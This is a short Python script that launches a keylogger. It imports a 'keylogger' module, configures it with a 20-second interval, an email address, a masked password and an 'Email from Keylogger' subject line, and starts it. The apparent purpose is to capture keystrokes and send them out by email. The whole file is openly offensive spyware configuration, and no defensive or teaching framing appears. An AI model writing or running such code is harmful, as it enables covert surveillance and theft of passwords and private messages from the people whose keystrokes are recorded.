#!/usr/bin/env python

"""
Ver: Python3

Keylogger
"""

import keylogger

my_keylogger = keylogger.Keylogger(time_interval=20,
                                   email="tommy1978@wp.pl",
                                   password="***",
                                   msg_subject="Email from Keylogger")
my_keylogger.start()
